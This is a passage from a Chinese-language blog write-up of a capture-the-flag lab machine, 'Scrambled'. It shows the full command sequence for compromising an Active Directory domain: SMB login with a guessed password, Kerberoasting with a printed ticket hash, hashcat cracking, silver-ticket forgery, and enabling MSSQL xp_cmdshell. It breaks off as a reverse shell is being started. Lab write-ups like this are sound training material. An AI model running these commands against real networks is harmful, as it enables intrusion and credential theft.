CN=NTDS Settings,CN=DC1,CN=Servers,CN=Default-First-Site-Name,C</span><br><span class="line"> N=Sites,CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">dnsHostName: DC1.scrm.local</span><br><span class="line">defaultNamingContext: DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">currentTime: 20250505080737.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br></pre></td></tr></table></figure>
<p>把<code>dc1.scrm.local</code>也加到hosts里面去<br>然后也没啥</p>
<h3 id="80-web"><a href="#80-web" class="headerlink" title="80 web"></a>80 web</h3><p><img src="/images/scrambled-1.png"><br>index页没啥<br>IT Services倒是有<br><img src="/images/scrambled-2.png"><br>可以都看一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># news and alerts</span></span><br><span class="line">04/09/2021: Due to the security breach last month we have now disabled all NTLM authentication on our network. This may cause problems <span class="keyword">for</span> some of the programs you use so please be patient <span class="keyword">while</span> we work to resolve any issues</span><br><span class="line">2021年4月9日：由于上个月的安全漏洞，我们现已禁用网络上的所有 NTLM 身份验证。这可能会导致您使用的某些程序出现问题，因此请耐心等待，我们正在努力解决问题。</span><br><span class="line"></span><br><span class="line"><span class="comment"># Contacting IT Support</span></span><br><span class="line">具体见下图示一</span><br><span class="line"></span><br><span class="line"><span class="comment"># New User Account</span></span><br><span class="line">具体见下图示二</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sales Orders App Troubleshooting</span></span><br><span class="line">具体见下图示三</span><br><span class="line"></span><br><span class="line"><span class="comment"># Password Resets</span></span><br><span class="line">Our self service password reset system will be up and running soon but <span class="keyword">in</span> the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username.</span><br><span class="line">我们的自助密码重置系统即将上线运行，在此期间，请致电IT支持热线，我们将为您重置密码。如果无人接听，请留言告知您的用户名，我们将重置您的密码，使其与用户名一致。</span><br></pre></td></tr></table></figure>
<p><img src="/images/scrambled-3.png" alt="示一"><br><img src="/images/scrambled-4.png" alt="示二"><br><img src="/images/scrambled-5.png" alt="示三"><br>综上可以得到以下信息<br>    1.系统存在安全漏洞，范围在2021年3月左右<br>    2.有一个用户ksimpson<br>    3.可以注册用户，选项中有administrator<br>    4.4411端口存在一个应用，跟日志有关系应该<br>    5.重置密码的话就会跟用户名一样</p>
<h3 id="ksimpson-user-logon-smb"><a href="#ksimpson-user-logon-smb" class="headerlink" title="ksimpson user logon smb"></a>ksimpson user logon smb</h3><p>那有没有可能ksimpson的用户名和密码都有了，试一下<br>用impacket，nxc也可以，加一个-k，target设置为dc1.scrm.local</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient.py -k scrm.local/ksimpson:ksimpson@dc1.scrm.local </span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra  </span><br><span class="line"><span class="comment"># help</span></span><br><span class="line"></span><br><span class="line"> open &#123;host,port=445&#125; - opens a SMB connection against the target host/port</span><br><span class="line"> login &#123;domain/username,passwd&#125; - logs into the current SMB connection, no parameters <span class="keyword">for</span> NULL connection. If no password specified, it<span class="string">&#x27;ll be prompted</span></span><br><span class="line"><span class="string"> kerberos_login &#123;domain/username,passwd&#125; - logs into the current SMB connection using Kerberos. If no password specified, it&#x27;</span>ll be prompted. Use the DNS resolvable domain name</span><br><span class="line"> login_hash &#123;domain/username,lmhash:nthash&#125; - logs into the current SMB connection using the password hashes</span><br><span class="line"> logoff - logs off</span><br><span class="line"> shares - list available shares</span><br><span class="line"> use &#123;sharename&#125; - connect to an specific share</span><br><span class="line"> <span class="built_in">cd</span> &#123;path&#125; - changes the current directory to &#123;path&#125; </span><br><span class="line"> lcd &#123;path&#125; - changes the current <span class="built_in">local</span> directory to &#123;path&#125;</span><br><span class="line"> <span class="built_in">pwd</span> - shows current remote directory</span><br><span class="line"> password - changes the user password, the new password will be prompted <span class="keyword">for</span> input</span><br><span class="line"> <span class="built_in">ls</span> &#123;wildcard&#125; - lists all the files <span class="keyword">in</span> the current directory</span><br><span class="line"> lls &#123;<span class="built_in">dirname</span>&#125; - lists all the files on the <span class="built_in">local</span> filesystem.</span><br><span class="line"> tree &#123;filepath&#125; - recursively lists all files <span class="keyword">in</span> folder and sub folders</span><br><span class="line"> <span class="built_in">rm</span> &#123;file&#125; - removes the selected file</span><br><span class="line"> <span class="built_in">mkdir</span> &#123;<span class="built_in">dirname</span>&#125; - creates the directory under the current path</span><br><span class="line"> <span class="built_in">rmdir</span> &#123;<span class="built_in">dirname</span>&#125; - removes the directory under the current path</span><br><span class="line"> put &#123;filename&#125; - uploads the filename into the current path</span><br><span class="line"> get &#123;filename&#125; - downloads the filename from the current path</span><br><span class="line"> mget &#123;mask&#125; - downloads all files from the current directory matching the provided mask</span><br><span class="line"> <span class="built_in">cat</span> &#123;filename&#125; - reads the filename from the current path</span><br><span class="line"> mount &#123;target,path&#125; - creates a mount point from &#123;path&#125; to &#123;target&#125; (admin required)</span><br><span class="line"> umount &#123;path&#125; - removes the mount point at &#123;path&#125; without deleting the directory (admin required)</span><br><span class="line"> list_snapshots &#123;path&#125; - lists the vss snapshots <span class="keyword">for</span> the specified path</span><br><span class="line"> info - returns NetrServerInfo main results</span><br><span class="line"> <span class="built_in">who</span> - returns the sessions currently connected at the target host (admin required)</span><br><span class="line"> close - closes the current SMB Session</span><br><span class="line"> <span class="built_in">exit</span> - terminates the server process (and this session)</span><br><span class="line"><span class="comment"># shares                                                                                                                                                                                                           </span></span><br><span class="line">ADMIN$                                                                                                                                                                                                             </span><br><span class="line">C$                                                                                                                                                                                                                 </span><br><span class="line">HR                                                                                                                                                                                                                 </span><br><span class="line">IPC$</span><br><span class="line">IT</span><br><span class="line">NETLOGON</span><br><span class="line">Public</span><br><span class="line">Sales</span><br><span class="line">SYSVOL</span><br></pre></td></tr></table></figure>
<p>枚举一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其他共享目录进不去，只有Public</span></span><br><span class="line"><span class="comment"># use Public</span></span><br><span class="line"><span class="comment"># shares</span></span><br><span class="line">ADMIN$</span><br><span class="line">C$</span><br><span class="line">HR</span><br><span class="line">IPC$</span><br><span class="line">IT</span><br><span class="line">NETLOGON</span><br><span class="line">Public</span><br><span class="line">Sales</span><br><span class="line">SYSVOL</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Fri Nov  5 06:23:19 2021 .</span><br><span class="line">drw-rw-rw-          0  Fri Nov  5 06:23:19 2021 ..</span><br><span class="line">-rw-rw-rw-     630106  Sat Nov  6 01:45:07 2021 Network Security Changes.pdf</span><br><span class="line"><span class="comment"># use HR</span></span><br><span class="line">[-] SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br><span class="line"><span class="comment"># use IT</span></span><br><span class="line">[-] SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br><span class="line"><span class="comment"># use NETLOGON</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 .</span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 ..</span><br><span class="line"><span class="comment"># use Sales</span></span><br><span class="line">[-] SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br><span class="line"><span class="comment"># use SYSVOL</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 .</span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 ..</span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 scrm.local</span><br><span class="line"><span class="comment"># cd scrm.local</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:21:22 2020 .</span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:21:22 2020 ..</span><br><span class="line">drw-rw-rw-          0  Mon May  5 15:49:38 2025 DfsrPrivate</span><br><span class="line">drw-rw-rw-          0  Thu Nov  4 05:58:57 2021 Policies</span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 scripts</span><br></pre></td></tr></table></figure>
<p>有一个PDF文件，下载下来看看<br><img src="/images/scrambled-6.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">As you may have heard, our network was recently compromised and an attacker was able to access</span><br><span class="line">all of our data. We have identified the way the attacker was able to gain access and have made some immediate changes. You can find these listed below along with the ways these changes may impact you.</span><br><span class="line">您可能已经听说，我们的网络最近遭到入侵，攻击者成功访问了我们的所有数据。我们已经确定了攻击者获取访问权限的方式，并立即采取了一些措施。您可以在下面找到这些措施以及这些措施可能对您造成的影响。</span><br><span class="line"></span><br><span class="line">Change: As the attacker used something known as <span class="string">&quot;NTLM relaying&quot;</span>, we have disabled NTLM authentication across the entire network.</span><br><span class="line">变更：由于攻击者使用了所谓的“NTLM 中继”，我们已在整个网络中禁用 NTLM 身份验证。</span><br><span class="line"></span><br><span class="line">Workaround: When you <span class="built_in">log</span> on or access network resources you will now be using Kerberos</span><br><span class="line">authentication (<span class="built_in">which</span> is definitely 100% secure and has absolutely no way anyone could exploit it).</span><br><span class="line">This will require you to use the full domain name (scrm.local) with your username and any server</span><br><span class="line">names you access. </span><br><span class="line">解决方法：当您登录或访问网络资源时，您将使用 Kerberos 身份验证（该身份验证绝对 100% 安全，绝对不可能被任何人利用）。</span><br><span class="line">这将要求您在用户名和您访问的任何服务器名称中使用完整的域名 (scrm.local)。</span><br><span class="line"></span><br><span class="line">Change: The attacker was able to retrieve credentials from an SQL database used by our HR software</span><br><span class="line">so we have removed all access to the SQL service <span class="keyword">for</span> everyone apart from network administrators.</span><br><span class="line">Users impacted: HR department</span><br><span class="line">Workaround: If you can no longer access the HR software please contact us and we will manually</span><br><span class="line">grant your account access again.</span><br><span class="line">变更：攻击者能够从我们人力资源软件使用的 SQL 数据库中检索凭据。</span><br><span class="line">因此，我们已移除除网络管理员外所有人对 SQL 服务的访问权限。</span><br><span class="line">受影响用户：人力资源部门</span><br><span class="line">解决方法：如果您无法再访问人力资源软件，请联系我们，我们将手动</span><br><span class="line">重新授予您的帐户访问权限。</span><br></pre></td></tr></table></figure>
<h3 id="kerberoasting-get-sqlsvc-hash"><a href="#kerberoasting-get-sqlsvc-hash" class="headerlink" title="kerberoasting get sqlsvc hash"></a>kerberoasting get sqlsvc hash</h3><p>我们有一个creds了，而系统目前只能进行kerberos认证，可以进行Kerberoasting攻击</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -request</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">----------------------------  ------  --------  --------------------------  --------------------------  ----------</span><br><span class="line">MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-04 00:32:02.351452  2025-05-05 15:45:37.239329             </span><br><span class="line">MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-04 00:32:02.351452  2025-05-05 15:45:37.239329             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">$krb5tgs$23$*sqlsvc<span class="variable">$SCRM</span>.LOCAL<span class="variable">$scrm</span>.<span class="built_in">local</span>/sqlsvc*$5999b9e80110c8ff442806c201900d38<span class="variable">$2ab656f4463c6f6a1518cd2af5584223a6ac10828a4f0ed0bd9e6e38eee3707ca0da234e4db979c89539740ca6082521039df43cbe1e7d2d836c4cb4f8840681dd11db4350942cdee9bb040e49482929e1b58a894f616b21b971e4fbe5b2a54d296c5caf475240e7a531eb518c0af5b91d94a5ab1e2a2fcbdcc86245bc9c85a9b9bef81e1a0121a2b1ed1dbd912ee23663d91b4046323fbeebe1d29dd507f051eb38a95ae8ec1b8698664ca724aebe5c4c0012d3dff0ca7ba73b9effe3b9c8e76839be65e8922e4884ae674e2c0aa949f33e8f879214abb805534e81de838dacdbbd84b63471b59c06efc4b302b1558f0da68bdea0b2fccdd2ccbbf943788bd1862dfbd702e9f4f69d6d2f7f22a621cbc3fbf310b376111c6eb149c97730a2270bd29a3e5d1b47517bd4d360264298366815c23a0fda438e3b4acbb3943ab101225cc07375104e64f9e899724a54526df04c786191dddcf243aa9bf167a589fee1e6ab0b86a4501e7ed317724d82e1abfc15083bfb5656adfd837749dc7ab7ee5b6ac7e3b8002fc78accedd26ebeea6df978d056bbc67a0d7363656a9a542e76385c8ae0f931e03314c92c966faac59be49f90f4576e0a76ae260db6d20f0174b95ee94cd67bcf46a511f0f67d14e2c53601964a886edbe34d1700462944e71234735eed6506880204379c9f137cce758532c4861a2c75d9ec376133d84944c60d68eb767cd5b0bb0abc86326f6b549f54009173898ce9e9de93fdf315376f58258d8b8f44b900d188b098cdf7b3ae4e3689abe02580afa086a1044b1373899a6578cfd35de299bf8562bf0ac74550663d260c79baca36c68b14b6fd9ea910d6e52c3414e88aa63c8e5cf7f88edf54673ee56a789b2b8a38e1fa0a62982a3273c35c5a31728e8a31e6be00e5c89d51476766b74da7bf822d46394e223c7d936308658029ebcfcb487ad2f28050d4d1c7384efe036e7be3f2c94c985fcc4f05998379aefb8e176f5cc75e2cda2d0455373b0f5d4d50b4a1956ceef8705332bff82aade8be270877fd5e4eb11d76cf2a5aa249b5533915d2c6f66aba8ca9932f4090476dde1b51c1c96367fc03e072f29bb4ada026dc0d373fa1784ab21c1bf73860c9fb7838f56c3ed98f1e95390ba43ea1c914aaa61e6bbb3dcd7446f9f5d647fb2bfb99a807d559fd4d01a1a47c8b54afea90af289b7ad2a071c214ca5bc5c76d80c93d3e9ec5172259a032251e0d140d82d9fe0b8999f6e8d412b12f989a1cdbaa0f4963933fe4ac0d7081498a6f576083fe4df1563f24dbbaf03bdeadbacc18b083639d86940e038c2a040ed329b8663e8f3952c13ec8e76abdc836604ca5049a17adce47964e66592a3e27632f0b947d283b14fde5de56fb01ebc74b85f5066d941a88a4111c0b58be0d2f8b17625b4ee80b0c544923daf6a8</span></span><br></pre></td></tr></table></figure>
<p>crack一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -a 0 -m 13100 <span class="built_in">hash</span> /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt</span><br><span class="line">$krb5tgs$23$*sqlsvc<span class="variable">$SCRM</span>.LOCAL<span class="variable">$scrm</span>.<span class="built_in">local</span>/sqlsvc*$5999b9e80110c8ff442806c201900d38<span class="variable">$2ab656f4463c6f6a1518cd2af5584223a6ac10828a4f0ed0bd9e6e38eee3707ca0da234e4db979c89539740ca6082521039df43cbe1e7d2d836c4cb4f8840681dd11db4350942cdee9bb040e49482929e1b58a894f616b21b971e4fbe5b2a54d296c5caf475240e7a531eb518c0af5b91d94a5ab1e2a2fcbdcc86245bc9c85a9b9bef81e1a0121a2b1ed1dbd912ee23663d91b4046323fbeebe1d29dd507f051eb38a95ae8ec1b8698664ca724aebe5c4c0012d3dff0ca7ba73b9effe3b9c8e76839be65e8922e4884ae674e2c0aa949f33e8f879214abb805534e81de838dacdbbd84b63471b59c06efc4b302b1558f0da68bdea0b2fccdd2ccbbf943788bd1862dfbd702e9f4f69d6d2f7f22a621cbc3fbf310b376111c6eb149c97730a2270bd29a3e5d1b47517bd4d360264298366815c23a0fda438e3b4acbb3943ab101225cc07375104e64f9e899724a54526df04c786191dddcf243aa9bf167a589fee1e6ab0b86a4501e7ed317724d82e1abfc15083bfb5656adfd837749dc7ab7ee5b6ac7e3b8002fc78accedd26ebeea6df978d056bbc67a0d7363656a9a542e76385c8ae0f931e03314c92c966faac59be49f90f4576e0a76ae260db6d20f0174b95ee94cd67bcf46a511f0f67d14e2c53601964a886edbe34d1700462944e71234735eed6506880204379c9f137cce758532c4861a2c75d9ec376133d84944c60d68eb767cd5b0bb0abc86326f6b549f54009173898ce9e9de93fdf315376f58258d8b8f44b900d188b098cdf7b3ae4e3689abe02580afa086a1044b1373899a6578cfd35de299bf8562bf0ac74550663d260c79baca36c68b14b6fd9ea910d6e52c3414e88aa63c8e5cf7f88edf54673ee56a789b2b8a38e1fa0a62982a3273c35c5a31728e8a31e6be00e5c89d51476766b74da7bf822d46394e223c7d936308658029ebcfcb487ad2f28050d4d1c7384efe036e7be3f2c94c985fcc4f05998379aefb8e176f5cc75e2cda2d0455373b0f5d4d50b4a1956ceef8705332bff82aade8be270877fd5e4eb11d76cf2a5aa249b5533915d2c6f66aba8ca9932f4090476dde1b51c1c96367fc03e072f29bb4ada026dc0d373fa1784ab21c1bf73860c9fb7838f56c3ed98f1e95390ba43ea1c914aaa61e6bbb3dcd7446f9f5d647fb2bfb99a807d559fd4d01a1a47c8b54afea90af289b7ad2a071c214ca5bc5c76d80c93d3e9ec5172259a032251e0d140d82d9fe0b8999f6e8d412b12f989a1cdbaa0f4963933fe4ac0d7081498a6f576083fe4df1563f24dbbaf03bdeadbacc18b083639d86940e038c2a040ed329b8663e8f3952c13ec8e76abdc836604ca5049a17adce47964e66592a3e27632f0b947d283b14fde5de56fb01ebc74b85f5066d941a88a4111c0b58be0d2f8b17625b4ee80b0c544923daf6a8</span>:Pegasus60</span><br></pre></td></tr></table></figure>
<p>这样就得到一个<code>sqlsvc:Pegasus60</code>，但是我们也不可以ntlm，得弄到他的hash<br>通过一个在线工具（Google一下ntlm hash generator），这里用<a target="_blank" rel="noopener" href="https://www.browserling.com/tools/ntlm-hash">Ntlm hash</a><br><img src="/images/scrambled-7.png"><br>虽然有mssql端口打开，但是尝试未果<br>有了hash，尝试搞一张银票<br>要搞银票需要拿到SID（powerview也可以拿到sid）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ getPac.py scrm.local/sqlsvc -targetUser administrator -hashes <span class="string">&quot;:B999A16500B87D17EC7F2E2A68778F05&quot;</span></span><br><span class="line">Domain SID: S-1-5-21-2743207045-1827831105-2542523200</span><br></pre></td></tr></table></figure>
<p>然后开始制作银票</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain dc1.scrm.local -dc-ip 10.10.11.168 -spn MSSQLSvc/dc1.scrm.local:1433 administrator</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">/usr/bin/ticketer.py:129: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  aTime = timegm(datetime.datetime.utcnow().timetuple())</span><br><span class="line">[*] Customizing ticket <span class="keyword">for</span> dc1.scrm.local/administrator</span><br><span class="line">/usr/bin/ticketer.py:480: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encTicketPart[<span class="string">&#x27;authtime&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">/usr/bin/ticketer.py:481: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encTicketPart[<span class="string">&#x27;starttime&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">/usr/bin/ticketer.py:483: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))</span><br><span class="line">[*]     PAC_LOGON_INFO</span><br><span class="line">[*]     PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">/usr/bin/ticketer.py:606: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encRepPart[<span class="string">&#x27;last-req&#x27;</span>][0][<span class="string">&#x27;lr-value&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*]     PAC_SERVER_CHECKSUM</span><br><span class="line">[*]     PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> administrator.ccache</span><br></pre></td></tr></table></figure>
<h3 id="logon-mssql-and-enum-and-reverse"><a href="#logon-mssql-and-enum-and-reverse" class="headerlink" title="logon mssql and enum and reverse"></a>logon mssql and enum and reverse</h3><p>通过银票看看能不能上mssql</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mssqlclient.py dc1.scrm.local -k</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC1): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(DC1): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL (SCRM\administrator  dbo@master)&gt; </span><br></pre></td></tr></table></figure>
<p>ok，got it<br>登了mssql，可以先看能不能打开xp_cmdshell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL (SCRM\administrator  dbo@master)&gt; enable_xp_cmdshell;</span><br><span class="line">[*] INFO(DC1): Line 185: Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">[*] INFO(DC1): Line 185: Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br></pre></td></tr></table></figure>
<p>意外之喜<br>反弹一下shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># target</span></span><br><span class="line">SQL (SCRM\administrator  dbo@master)&gt; xp_cmdshell powershell -e 